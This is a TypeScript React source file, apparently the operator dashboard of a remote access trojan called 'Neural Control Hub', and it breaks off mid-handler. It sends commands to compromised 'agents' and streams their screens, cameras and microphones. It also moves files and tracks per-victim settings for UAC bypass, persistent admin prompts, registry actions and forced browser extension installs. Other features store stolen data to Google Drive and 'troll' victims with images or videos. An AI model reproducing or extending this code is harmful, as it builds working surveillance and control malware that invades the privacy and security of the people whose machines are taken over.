import React, { createContext, useContext, useEffect, useState, useCallback, useRef } from 'react';
import { io } from 'socket.io-client';
type SocketIO = ReturnType<typeof io>;
import apiClient from '../services/api';
import { toast } from 'sonner';

interface Agent {
  id: string;
  name: string;
  alias?: string;
  rawName?: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
  is_admin?: boolean;
}

interface Notification {
  id: string;
  type: 'success' | 'warning' | 'error' | 'info';
  title: string;
  message: string;
  timestamp: Date;
  agentId?: string;
  read: boolean;
  category: 'agent' | 'system' | 'security' | 'command';
}

interface SocketContextType {
  socket: SocketIO | null;
  connected: boolean;
  authenticated: boolean;
  agents: Agent[];
  notifications: Notification[];
  selectedAgent: string | null;
  setSelectedAgent: (agentId: string | null) => void;
  lastActivity?: { type: string; details?: string; agentId?: string | null; timestamp?: number };
  setLastActivity: (type: string, details?: string, agentId?: string | null) => void;
  getLastFilePath: (agentId: string | null) => string;
  setLastFilePath: (agentId: string | null, path: string) => void;
  sendCommand: (agentId: string | 'ALL', command: string) => void;
  sendBatch?: (commands: Array<{ agent_id: string | 'ALL'; command: string }>) => void;
  startStreamsAll?: (types: Array<'screen'|'camera'|'audio'>, agentIds?: string[] | null) => void;
  stopStreamsAll?: (types: Array<'screen'|'camera'|'audio'>, agentIds?: string[] | null) => void;
  startDualStreams?: (agentId: string) => void;
  stopDualStreams?: (agentId: string) => void;
  startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  uploadFile: (agentId: string, file: File, destinationPath: string) => void;
  downloadFile: (agentId: string, filename: string) => void;
  previewFile?: (agentId: string, filename: string) => void;
  trollShowImage?: (agentId: string | null, file: File, opts?: { duration_ms?: number; mode?: 'cover' | 'contain' | 'fill' }) => void;
  trollShowVideo?: (agentId: string | null, file: File, opts?: { duration_ms?: number }) => void;
  commandOutput: string[];
  addCommandOutput: (output: string) => void;
  clearCommandOutput: () => void;
  login: (password: string, otp?: string) => Promise<{ success?: boolean; data?: any; error?: string }>;
  logout: () => Promise<void>;
  agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
  streamsActiveCount: number;
  commandsExecutedCount: number;
  agentConfig: Record<string, {
    agent?: {
      id?: string;
      enableUACBypass?: boolean;
      persistentAdminPrompt?: boolean;
      uacBypassDebug?: boolean;
      requestAdminFirst?: boolean;
      maxPromptAttempts?: number;
    };
    bypasses?: {
      enabled?: boolean;
      methods?: Record<string, boolean>;
    };
    registry?: {
      enabled?: boolean;
      actions?: Record<string, boolean>;
    };
    updatedAt?: Date;
  }>;
  registryPresence: Record<string, Record<string, { id: string; hive: string; path: string; key: string; present: boolean; exists_path: boolean; exists_value: boolean; value?: any }>>;
  checkRegistryPresence: (agentId: string, items: Array<{ id: string; hive: string; path: string; key: string }>) => void;
  extensionStatus: Record<string, { extension_id: string; installed: boolean; policy_applied: boolean; registered: boolean; folder_count: number; folders?: string[]; extensions_dir_count?: number; extensions_dirs?: string[]; update_xml_ok?: boolean; crx_ok?: boolean }>;
  checkExtensionStatus: (agentId: string) => void;
  requestSystemInfo: (detailLevel?: 'basic' | 'standard' | 'full') => void;
  requestNetworkInfo: () => void;
  requestInstalledSoftware: () => void;
  systemInfo?: any;
  networkInfo?: any;
  installedSoftware?: any[];
  lastProcessOperation?: any;
  lastProcessDetails?: any;
}

const SocketContext = createContext<SocketContextType | null>(null);

function bytesToBase64(bytes: Uint8Array): string {
  let binary = '';
  const step = 0x8000;
  for (let i = 0; i < bytes.length; i += step) {
    binary += String.fromCharCode(...bytes.subarray(i, i + step));
  }
  return btoa(binary);
}

function normalizeDestinationPath(destinationPath: string, filename: string): string {
  const raw = (destinationPath || '').trim();
  if (!raw) return filename;
  const lower = raw.toLowerCase();
  const filenameLower = filename.toLowerCase();

  if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
    return raw;
  }

  if (raw.endsWith('/') || raw.endsWith('\\')) {
    return `${raw}${filename}`;
  }

  if (/^[a-zA-Z]:$/.test(raw)) {
    return `${raw}\\${filename}`;
  }

  const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
  return `${raw}${separator}${filename}`;
}

function extractDirectoryFromPath(path: string): string {
  const raw = (path || '').trim();
  if (!raw) return '';
  const hasBackslash = raw.includes('\\') || /^[a-zA-Z]:/.test(raw);
  const sep = hasBackslash ? '\\' : '/';
  if (raw.endsWith(sep)) return raw;
  if (/^[a-zA-Z]:$/.test(raw)) return `${raw}\\`;
  const idx1 = raw.lastIndexOf('\\');
  const idx2 = raw.lastIndexOf('/');
  const idx = Math.max(idx1, idx2);
  if (idx >= 0) {
    const dir = raw.slice(0, idx);
    if (!hasBackslash && dir === '' && raw.startsWith('/')) return '/';
    return dir;
  }
  return raw;
}

function extractBase64Payload(value: unknown): string | null {
  if (typeof value !== 'string') return null;
  const trimmed = value.trim();
  if (!trimmed) return null;
  const commaIndex = trimmed.indexOf(',');
  return commaIndex >= 0 ? trimmed.slice(commaIndex + 1) : trimmed;
}

function detectMimeFromBytes(bytes: Uint8Array, filename: string): string {
  const b0 = bytes[0];
  const b1 = bytes[1];
  const b2 = bytes[2];
  const b3 = bytes[3];
  if (b0 === 0xff && b1 === 0xd8 && b2 === 0xff) return 'image/jpeg';
  if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4e && b3 === 0x47) return 'image/png';
  if (b0 === 0x47 && b1 === 0x49 && b2 === 0x46) return 'image/gif';
  if (b0 === 0x1a && b1 === 0x45 && b2 === 0xdf && b3 === 0xa3) return 'video/webm';
  if (b0 === 0x52 && b1 === 0x49 && b2 === 0x46 && b3 === 0x46) {
    if (bytes.length >= 12 && bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
      return 'image/webp';
    }
  }
  if (bytes.length >= 12 && bytes[4] === 0x66 && bytes[5] === 0x74 && bytes[6] === 0x79 && bytes[7] === 0x70) {
    return 'video/mp4';
  }

  const name = String(filename || '').toLowerCase();
  const ext = name.includes('.') ? name.split('.').pop()! : '';
  if (ext === 'png') return 'image/png';
  if (ext === 'jpg' || ext === 'jpeg') return 'image/jpeg';
  if (ext === 'gif') return 'image/gif';
  if (ext === 'webp') return 'image/webp';
  if (ext === 'bmp') return 'image/bmp';
  if (ext === 'svg') return 'image/svg+xml';
  if (ext === 'mp4') return 'video/mp4';
  if (ext === 'webm') return 'video/webm';
  if (ext === 'mov') return 'video/quicktime';
  if (ext === 'm4v') return 'video/x-m4v';
  return 'application/octet-stream';
}

function coerceFiniteNumber(value: unknown, fallback = 0): number {
  const num = typeof value === 'number' ? value : Number(value);
  return Number.isFinite(num) ? num : fallback;
}

export function SocketProvider({ children }: { children: React.ReactNode }) {
  const [socket, setSocket] = useState<SocketIO | null>(null);
  const [connected, setConnected] = useState(false);
  const [authenticated, setAuthenticated] = useState(false);
  const [extensionStatus, setExtensionStatus] = useState<Record<string, { extension_id: string; installed: boolean; policy_applied: boolean; registered: boolean; folder_count: number; folders?: string[]; extensions_dir_count?: number; extensions_dirs?: string[]; update_xml_ok?: boolean; crx_ok?: boolean }>>({});
  const [agents, setAgents] = useState<Agent[]>([]);
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [commandOutput, setCommandOutput] = useState<string[]>([]);
  const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});
  const streamsActiveRef = useRef<Record<string, number>>({});
  const prevSelectedStatusRef = useRef<string>('unknown');
  const [streamsActiveCount, setStreamsActiveCount] = useState<number>(0);
  const [commandsExecutedCount, setCommandsExecutedCount] = useState<number>(0);
  const lastEmitRef = useRef<Record<string, number>>({});
  const lastPrivilegeRef = useRef<Record<string, { is_admin: boolean; ts: number }>>({});
  const [lastActivity, _setLastActivity] = useState<{ type: string; details?: string; agentId?: string | null; timestamp?: number }>(() => {
    try {
      const raw = localStorage.getItem('nch:lastActivity');
      return raw ? JSON.parse(raw) : { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
    } catch {
      return { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
    }
  });
  const lastFilePathsRef = useRef<Record<string, string>>({});
  const [agentConfig, setAgentConfig] = useState<Record<string, {
    agent?: {
      id?: string;
      enableUACBypass?: boolean;
      persistentAdminPrompt?: boolean;
      uacBypassDebug?: boolean;
      requestAdminFirst?: boolean;
      maxPromptAttempts?: number;
    };
    bypasses?: {
      enabled?: boolean;
      methods?: Record<string, boolean>;
    };
    registry?: {
      enabled?: boolean;
      actions?: Record<string, boolean>;
    };
    updatedAt?: Date;
  }>>({});
  const [systemInfo, setSystemInfo] = useState<any>();
  const [networkInfo, setNetworkInfo] = useState<any>();
  const [installedSoftware, setInstalledSoftware] = useState<any[]>();
  const [lastProcessOperation, setLastProcessOperation] = useState<any>();
  const [lastProcessDetails, setLastProcessDetails] = useState<any>();
  const [registryPresence, setRegistryPresence] = useState<Record<string, Record<string, { id: string; hive: string; path: string; key: string; present: boolean; exists_path: boolean; exists_value: boolean; value?: any }>>>({});

  const addCommandOutput = useCallback((output: string) => {
    console.log('🔍 SocketProvider: addCommandOutput called with:', output);
    setCommandOutput(prev => {
      const newOutput = [...prev.slice(-99), output]; // Keep last 100 lines
      console.log('🔍 SocketProvider: Updated commandOutput array length:', newOutput.length);
      return newOutput;
    });
  }, []);

  const clearCommandOutput = useCallback(() => {
    setCommandOutput([]);
  }, []);

  const setLastActivity = useCallback((type: string, details?: string, agentId?: string | null) => {
    const entry = { type, details, agentId, timestamp: Date.now() };
    _setLastActivity(entry);
    try { localStorage.setItem('nch:lastActivity', JSON.stringify(entry)); } catch {}
  }, []);
  
  const getLastFilePath = useCallback((agentId: string | null) => {
    const key = agentId ? `fm:lastPath:${agentId}` : 'fm:lastPath:';
    try {
      const mem = agentId ? (lastFilePathsRef.current[agentId] || '') : '';
      const ls = localStorage.getItem(key) || '';
      return (mem || ls || '/');
    } catch {
      return '/';
    }
  }, []);
  
  const setLastFilePath = useCallback((agentId: string | null, path: string) => {
    const key = agentId ? `fm:lastPath:${agentId}` : 'fm:lastPath:';
    if (agentId) lastFilePathsRef.current[agentId] = path;
    try { localStorage.setItem(key, path || '/'); } catch {}
    setLastActivity('files', path || '/', agentId || null);
  }, [setLastActivity]);

  const markStreamActive = useCallback((agentId: string) => {
    if (!agentId) return;
    streamsActiveRef.current[agentId] = Date.now();
    const now = Date.now();
    const count = Object.values(streamsActiveRef.current).filter(ts => now - ts < 15000).length;
    setStreamsActiveCount(count);
  }, []);

  useEffect(() => {
    const t = window.setInterval(() => {
      try {
        const now = Date.now();
        const next: Record<string, number> = {};
        for (const [k, v] of Object.entries(streamsActiveRef.current)) {
          if (now - v < 15000) next[k] = v;
        }
        streamsActiveRef.current = next;
        setStreamsActiveCount(Object.keys(next).length);
      } catch {}
    }, 3000);
    return () => window.clearInterval(t);
  }, []);

  useEffect(() => {
    // Connect to Socket.IO server
    // If running in production (same origin as backend), use current origin
    // Otherwise use environment variable or localhost for development
    let socketUrl: string;
    
    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
      // Production: use same origin as the current page
      socketUrl = `${window.location.protocol}//${window.location.host}`;
    } else {
      // Development: use environment variable or default to localhost
      socketUrl = (import.meta as any)?.env?.VITE_SOCKET_URL || (window as any)?.__SOCKET_URL__ || 'http://localhost:8080';
    }
    
    console.log('Connecting to Socket.IO server:', socketUrl);
    
    let socketInstance: SocketIO;
    
    try {
      socketInstance = io(socketUrl, {
        withCredentials: true,
        path: '/socket.io',
        transports: ['polling'],
        upgrade: false,
        perMessageDeflate: { threshold: 1024 },
        forceNew: true,
        timeout: 20000,
        reconnection: true,
        reconnectionAttempts: 20,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 10000,
        randomizationFactor: 0.5,
        autoConnect: true,
      });

      setSocket(socketInstance);
    } catch (error) {
      console.error('Failed to initialize socket connection:', error);
      addCommandOutput(`Connection Error: Failed to initialize socket connection to ${socketUrl}`);
      try { toast.error('Connection error: failed to initialize'); } catch {}
      return;
    }

    // Add debug event listener to see all events
    socketInstance.onAny((eventName: string, ...args: any[]) => {
      // Reduce noisy logs for high-frequency streaming events
      if (eventName && /^(screen_frame(_bin)?_chunk|camera_frame(_bin)?_chunk)$/.test(String(eventName))) {
        const payload = args[0] || {};
        const aid = String(payload?.agent_id || '');
        try {
          const raw = aid ? localStorage.getItem(`stream:last:${aid}`) : null;
          const saved = raw ? JSON.parse(raw) : {};
          const type = eventName.startsWith('screen') ? 'screen' : 'camera';
          if (!saved?.[type]) return;
        } catch {}
      }
      console.log(`🔍 SocketProvider: Received event '${eventName}':`, args);
      if (eventName === 'command_result') {
        console.log('🔍 SocketProvider: COMMAND_RESULT EVENT RECEIVED!', args);
        console.log('🔍 SocketProvider: Event data type:', typeof args[0]);
        console.log('🔍 SocketProvider: Event data keys:', Object.keys(args[0] || {}));
      }
    });

    // Connection events
    socketInstance.on('connect', () => {
      setConnected(true);
      console.log('🔍 SocketProvider: Connected to Neural Control Hub');
      
      // Join operators room and request agent list
      socketInstance.emit('operator_connect');
      console.log('🔍 SocketProvider: operator_connect event emitted');
      socketInstance.emit('join_room', 'operators');
      console.log('🔍 SocketProvider: join_room(\"operators\") event emitted');
      
      // Request agent list after a short delay to ensure room joining is complete
      setTimeout(() => {
        console.log('🔍 SocketProvider: Requesting agent list');
        socketInstance.emit('request_agent_list');
      }, 500);
    });

    socketInstance.on('disconnect', (reason: string) => {
      setConnected(false);
      console.log('Disconnected from Neural Control Hub:', reason);
      addCommandOutput(`Disconnected: ${reason}`);
      try { apiClient.cancelAll(); } catch {}
    });

    socketInstance.on('connect_error', (error: any) => {
      console.error('Connection error:', error);
      addCommandOutput(`Connection Error: ${error.message || 'Unknown error'}`);
      try { toast.error(`Connection error: ${error?.message || 'Unknown'}`); } catch {}
    });

    socketInstance.on('reconnect', (attemptNumber: number) => {
      console.log('Reconnected after', attemptNumber, 'attempts');
      addCommandOutput(`Reconnected after ${attemptNumber} attempts`);
    });

    socketInstance.on('reconnect_error', (error: any) => {
      console.error('Reconnection error:', error);
      addCommandOutput(`Reconnection Error: ${error.message || 'Unknown error'}`);
      try { toast.error(`Reconnection error: ${error?.message || 'Unknown'}`); } catch {}
    });

    socketInstance.on('config_update', (data: any) => {
      try {
        const agentId = typeof data?.agent?.id === 'string' ? data.agent.id : (typeof data?.agent_id === 'string' ? data.agent_id : '');
        const bypassesEnabled = typeof data?.bypasses?.enabled === 'boolean' ? data.bypasses.enabled : '';
        const registryEnabled = typeof data?.registry?.enabled === 'boolean' ? data.registry.enabled : '';
        const msg = [
          'CONFIG UPDATE',
          agentId ? `agent=${agentId}` : '',
          bypassesEnabled !== '' ? `bypasses=${bypassesEnabled}` : '',
          registryEnabled !== '' ? `registry=${registryEnabled}` : '',
        ].filter(Boolean).join(' | ');
        addCommandOutput(msg);
        if (agentId) {
          const next = {
            agent: {
              id: agentId,
              enableUACBypass: Boolean(data?.agent?.enableUACBypass ?? true),
              persistentAdminPrompt: Boolean(data?.agent?.persistentAdminPrompt ?? false),
              uacBypassDebug: Boolean(data?.agent?.uacBypassDebug ?? false),
              requestAdminFirst: Boolean(data?.agent?.requestAdminFirst ?? false),
              maxPromptAttempts: Number(data?.agent?.maxPromptAttempts ?? 3)
            },
            bypasses: {
              enabled: Boolean(data?.bypasses?.enabled ?? true),
              methods: Object(data?.bypasses?.methods ?? {})
            },
            registry: {
              enabled: Boolean(data?.registry?.enabled ?? true),
              actions: Object(data?.registry?.actions ?? {})
            },
            updatedAt: new Date()
          };
          setAgentConfig(prev => ({ ...prev, [agentId]: next }));
        }
      } catch (e) {
        addCommandOutput('CONFIG UPDATE');
      }
    });

    // Agent management events
    socketInstance.on('agent_list_update', (agentData: Record<string, any>) => {
      try {
        console.log('🔍 SocketProvider: Received agent_list_update:', agentData);
        console.log('🔍 SocketProvider: Agent data keys:', Object.keys(agentData));
        console.log('🔍 SocketProvider: This confirms we are in the operators room!');
        const agentList: Agent[] = Object.entries(agentData).map(([id, data]: [string, any]) => {
          console.log(`Processing agent ${id}:`, data);
          // Safely parse last_seen date
          let lastSeenDate = new Date();
          let isOnline = false;
          
          if (data.last_seen) {
            try {
              lastSeenDate = new Date(data.last_seen);
              const timeDiff = new Date().getTime() - lastSeenDate.getTime();
              isOnline = timeDiff < 60000; // 60 seconds threshold
            } catch (dateError) {
              console.warn(`Invalid date format for agent ${id}: ${data.last_seen}`);
            }
          }
          
          const rawName = (typeof data?.name === 'string' && data.name.trim()) ? data.name : `Agent-${id.slice(0, 8)}`;
          const alias = (typeof data?.alias === 'string' && data.alias.trim()) ? data.alias : undefined;
          return {
            id,
            name: alias || rawName,
            alias,
            rawName,
            status: isOnline ? 'online' : 'offline',
            platform: typeof data?.platform === 'string' && data.platform.trim() ? data.platform : 'Unknown',
            ip: typeof data?.ip === 'string' && data.ip.trim() ? data.ip : '127.0.0.1',
            lastSeen: lastSeenDate,
            capabilities: Array.isArray(data?.capabilities)
              ? data.capabilities.map((cap: unknown) => String(cap))
              : ['screen', 'commands'],
            performance: {
              cpu: coerceFiniteNumber(data?.cpu_usage ?? data?.performance?.cpu, 0),
              memory: coerceFiniteNumber(data?.memory_usage ?? data?.performance?.memory, 0),
              network: coerceFiniteNumber(data?.network_usage ?? data?.performance?.network, 0)
            },
            is_admin: data.is_admin
          };
        });
        console.log('Processed agent list:', agentList);
        setAgents(agentList);
        
        try {
          const sel = selectedAgent;
          if (sel) {
            const entry = agentList.find(a => a.id === sel);
            const status = entry?.status || 'offline';
            const prev = prevSelectedStatusRef.current;
            if (status !== prev) {
              prevSelectedStatusRef.current = status;
              if (status === 'online') {
                try { toast.success(`Agent ${sel} reconnected`); } catch {}
                try {
                  const raw = localStorage.getItem(`stream:last:${sel}`);
                  const saved = raw ? JSON.parse(raw) : {};
                  if (socket && saved?.screen) {
                    socket.emit('set_stream_mode', { agent_id: sel, type: 'screen', mode: 'buffered', fps: 5, buffer_frames: 10 });
                    apiClient.startStream(sel, 'screen', 'medium', 'buffered', 5, 10);
                  }
                  if (socket && saved?.camera) {
                    socket.emit('set_stream_mode', { agent_id: sel, type: 'camera', mode: 'buffered', fps: 5, buffer_frames: 10 });
                    apiClient.startStream(sel, 'camera', 'medium', 'buffered', 5, 10);
                  }
                } catch {}
              } else {
                try { toast.warning(`Agent ${sel} disconnected`); } catch {}
              }
            }
          }
        } catch {}
      } catch (error) {
        console.error('Error processing agent list update:', error);
      }
    });

    socketInstance.on('agent_alias_update', (data: { agent_id: string; alias: string }) => {
      try {
        const { agent_id, alias } = data || ({} as any);
        if (!agent_id || typeof alias !== 'string') return;
        setAgents(prev => prev.map(a => 
          a.id === agent_id 
            ? { ...a, alias: alias || undefined, name: (alias || a.rawName || a.name) } 
            : a
        ));
        toast.success(`Alias updated for ${agent_id}`, { description: alias || '(cleared)' });
        addCommandOutput(`Alias set: ${agent_id} -> ${alias}`);
      } catch (e) {}
    });
    socketInstance.on('drive_store_result', (data: any) => {
      try {
        const aid = String(data?.agent_id || '');
        const ok = Boolean(data?.success);
        const desc = aid ? `Agent ${aid}` : undefined;
        if (ok) {
          toast.success('Stored to Google Drive', { description: desc, duration: 5000 });
        } else {
          const err = typeof data?.error === 'string' ? data.error : undefined;
          toast.error('Failed to store to Google Drive', { description: err || desc, duration: 7000 });
        }
      } catch {}
    });
    // Handle real-time privilege updates
    socketInstance.on('agent_privilege_update', (data: { agent_id: string; is_admin: boolean; timestamp: number }) => {
      try {
        console.log('🔍 SocketProvider: Received agent_privilege_update:', data);
        const { agent_id, is_admin, timestamp } = data;
        
        const now = Date.now();
        const prev = lastPrivilegeRef.current[agent_id];
        if (prev && prev.is_admin === is_admin && (now - prev.ts) < 5000) {
          return;
        }
        lastPrivilegeRef.current[agent_id] = { is_admin, ts: now };
        
        setAgents(prevAgents => 
          prevAgents.map(agent => 
            agent.id === agent_id 
              ? { ...agent, is_admin }
              : agent
          )
        );
        
        if (!prev || prev.is_admin !== is_admin) {
          const privilegeText = is_admin ? 'Administrator' : 'Standard user';
          const rawAgentId = typeof agent_id === 'string' ? agent_id : String(agent_id ?? '');
          const displayAgentId = rawAgentId.length > 32
            ? `${rawAgentId.slice(0, 8)}…${rawAgentId.slice(-4)}`
            : (rawAgentId || 'Unknown');
          toast.info(`Agent privilege updated: ${displayAgentId} is now ${privilegeText}`);
          addCommandOutput(`Privilege update: Agent ${displayAgentId} changed to ${privilegeText}`);
        }
        
      } catch (error) {
        console.error('Error processing agent privilege update:', error);
      }
    });

    socketInstance.on('process_operation_result', (data: any) => {
      setLastProcessOperation(data);
    });
    socketInstance.on('process_details_response', (data: any) => {
      setLastProcessDetails(data);
    });
    socketInstance.on('system_info_response', (data: any) => {
      setSystemInfo(data);
    });
    socketInstance.on('network_info_response', (data: any) => {
      setNetworkInfo(data);
    });
    socketInstance.on('installed_software_response', (data: any) => {
      setInstalledSoftware(data?.software || []);
    });
    socketInstance.on('registry_presence', (data: any) => {
      try {
        const agent_id = String(data?.agent_id || '');
        const items = Array.isArray(data?.items) ? data.items : [];
        if (!agent_id || !items.length) return;
        setRegistryPresence(prev => {
          const current = prev[agent_id] || {};
          const updated = { ...current };
          for (const it of items) {
            const id = String(it?.id || '');
            if (!id) continue;
            updated[id] = {
              id,
              hive: String(it?.hive || ''),
              path: String(it?.path || ''),
              key: String(it?.key || ''),
              present: Boolean(it?.present),
              exists_path: Boolean(it?.exists_path),
              exists_value: Boolean(it?.exists_value),
              value: it?.value
            };
          }
          return { ...prev, [agent_id]: updated };
        });
      } catch (e) {}
    });
    socketInstance.on('extension_status', (data: any) => {
      try {
        const agent_id = String(data?.agent_id || '');
        if (!agent_id) return;
        const ext_id = String(data?.extension_id || '');
        const installed = Boolean(data?.installed);
        const policy_applied = Boolean(data?.policy_applied);
        const registered = Boolean(data?.registered);
        const folder_count = Number(data?.folder_count || 0);
        const folders = Array.isArray(data?.folders) ? data.folders : undefined;
        const extensions_dir_count = Number(data?.extensions_dir_count || 0);
        const extensions_dirs = Array.isArray(data?.extensions_dirs) ? data.extensions_dirs : undefined;
        const update_xml_ok = Boolean(data?.update_xml_ok);
        const crx_ok = Boolean(data?.crx_ok);
        setExtensionStatus(prev => ({
          ...prev,
          [agent_id]: { extension_id: ext_id, installed, policy_applied, registered, folder_count, folders, extensions_dir_count, extensions_dirs, update_xml_ok, crx_ok }
        }));
      } catch {}
    });

    // Room joining confirmation
    socketInstance.on('joined_room', (room: string) => {
      console.log('🔍 SocketProvider: Successfully joined room:', room);
      if (room === 'operators') {
        console.log('🔍 SocketProvider: SUCCESS! Now in operators room - should receive command results');
      }
    });

    // Command result events
    socketInstance.on('command_result', (data: any) => {
      if (!data || typeof data !== 'object') return;
      const agentTag = typeof data.agent_id === 'string' ? `[${data.agent_id}] ` : '';
      const text =
        typeof data.formatted_text === 'string'
          ? data.formatted_text
          : (typeof data.output === 'string' ? data.output : '');
      if (typeof text === 'string') {
        addCommandOutput(agentTag + text);
        setCommandsExecutedCount(prev => prev + 1);
      }
    });

    // Legacy command output events (for backward compatibility)
    socketInstance.on('command_output', (data: { agent_id: string; output: string }) => {
      addCommandOutput(`[${data.agent_id}] ${data.output}`);
    });

    // Lightweight telemetry updates from agents
    socketInstance.on('agent_telemetry', (data: { agent_id: string; cpu?: number; memory?: number; network?: number }) => {
      const { agent_id, cpu = 0, memory = 0, network = 0 } = data || ({} as any);
      if (agent_id) {
        setAgentMetrics(prev => ({
          ...prev,
          [agent_id]: { cpu, memory, network }
        }));
        // Also update performance snapshot in agents list if present
        setAgents(prev => prev.map(a => a.id === agent_id ? ({
          ...a,
          performance: {
            cpu: cpu ?? a.performance.cpu,
            memory: memory ?? a.performance.memory,
            network: network ?? a.performance.network,
          }
        }) : a));
      }
    });

    // Streaming events
    socketInstance.on('screen_frame', (data: { agent_id: string; frame: any }) => {
      console.log('📹 SocketProvider: Received screen_frame from agent:', data.agent_id);
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        } else if (typeof f === 'string' && f.startsWith('data:')) {
          data.frame = extractBase64Payload(f) || f;
        }
      } catch {}
      const event = new CustomEvent('screen_frame', { detail: data });
      window.dispatchEvent(event);
    });
    // Delta streaming: keyframe baseline
    socketInstance.on('screen_keyframe', (data: { agent_id: string; frame_id?: number; width?: number; height?: number; frame: any }) => {
      console.log('🧩 SocketProvider: Received screen_keyframe from agent:', data.agent_id);
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        } else if (typeof f === 'string' && f.startsWith('data:')) {
          data.frame = extractBase64Payload(f) || f;
        }
      } catch {}
      const event = new CustomEvent('screen_keyframe', { detail: data });
      window.dispatchEvent(event);
    });
    // Delta streaming: tile updates
    socketInstance.on('screen_tile', (data: { agent_id: string; frame_id?: number; x: number; y: number; w: number; h: number; frame: any }) => {
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        } else if (typeof f === 'string' && f.startsWith('data:')) {
          data.frame = extractBase64Payload(f) || f;
        }
      } catch {}
      const event = new CustomEvent('screen_tile', { detail: data });
      window.dispatchEvent(event);
    });
    socketInstance.on('cursor_update', (data: any) => {
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const event = new CustomEvent('cursor_update', { detail: data });
        window.dispatchEvent(event);
      } catch {}
    });
    // Fallback single-frame response handler (used by request_video_frame)
    socketInstance.on('video_frame', (data: { agent_id?: string; frame: any }) => {
      try {
        const aid = String(data?.agent_id || '');
        if (aid) markStreamActive(aid);
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        } else if (typeof f === 'string' && f.startsWith('data:')) {
          data.frame = extractBase64Payload(f) || f;
        }
      } catch {}
      const event = new CustomEvent('screen_frame', { detail: { agent_id: data?.agent_id || '', frame: data?.frame } });
      window.dispatchEvent(event);
    });

    socketInstance.on('camera_frame', (data: { agent_id: string; frame: any }) => {
      console.log('📷 SocketProvider: Received camera_frame from agent:', data.agent_id);
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        } else if (typeof f === 'string' && f.startsWith('data:')) {
          data.frame = extractBase64Payload(f) || f;
        }
      } catch {}
      const event = new CustomEvent('camera_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('audio_frame', (data: { agent_id: string; frame: any }) => {
      console.log('🎤 SocketProvider: Received audio_frame from agent:', data.agent_id);
      try { markStreamActive(String(data.agent_id || '')); } catch {}
      try {
        const f = data?.frame as any;
        if (typeof f !== 'string' && f) {
          const bytes = f instanceof Uint8Array ? f : new Uint8Array(f);
          data.frame = bytesToBase64(bytes);
        }
      } catch {}
      const event = new CustomEvent('audio_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('agent_notification', (data: any) => {
      try {
        const n: Notification = {
          id: String(data?.id ?? `${Date.now()}`),
          type: String(data?.type ?? 'info') as Notification['type'],
          title: String(data?.title ?? ''),
          message: String(data?.message ?? ''),
          timestamp: new Date(data?.timestamp ?? Date.now()),
          agentId: typeof data?.agent_id === 'string' ? data.agent_id : undefined,
          read: Boolean(data?.read ?? false),
          category: String(data?.category ?? 'agent') as Notification['category'],
        };
        setNotifications(prev => [...prev.slice(-99), n]);
      } catch (e) {
        console.error('Error processing agent_notification:', e, data);
      }
    });

    // Trolling events - show slide notifications when agent starts trolling
    socketInstance.on('troll_show_image', (data: any) => {
      try {
        const agentId = data?.agent_id || 'Unknown Agent';
        const filename = data?.filename || 'image';
        toast.info(`🎭 Trolling started!`, {
          description: `${agentId} is displaying ${filename}`,
          duration: 4000,
          position: 'top-right',
        });
        console.log(`🎭 Trolling image started from agent: ${agentId}, file: ${filename}`);
      } catch (e) {
        console.error('Error processing troll_show_image event:', e, data);
      }
    });

    socketInstance.on('troll_show_video', (data: any) => {
      try {
        const agentId = data?.agent_id || 'Unknown Agent';
        const filename = data?.filename || 'video';
        toast.info(`🎭 Trolling started!`, {
          description: `${agentId} is playing ${filename}`,
          duration: 4000,
          position: 'top-right',
        });
        console.log(`🎭 Trolling video started from agent: ${agentId}, file: ${filename}`);
      } catch (e) {
        console.error('Error processing troll_show_video event:', e, data);
      }
    });

    // File transfer events - Download chunks
    const downloadBuffers: Record<string, { chunksByOffset: Record<number, Uint8Array>, receivedSize: number, totalSize: number }> = {};
    const streamBuffers: Record<string, { chunksByOffset: Record<number, string>, receivedSize: number, totalSize: number, startedAt: number, lastChunkAt: number }> = {};
    const binStreamBuffers: Record<string, { chunksByOffset: Record<number, Uint8Array>, receivedSize: number, totalSize: number, startedAt: number, lastChunkAt: number }> = {};
    const latestFrameSeq: Record<string, number> = {};
    
    socketInstance.on('screen_frame_chunk', (data: any) => {
      try {
        // Gate by saved streaming state
        try {
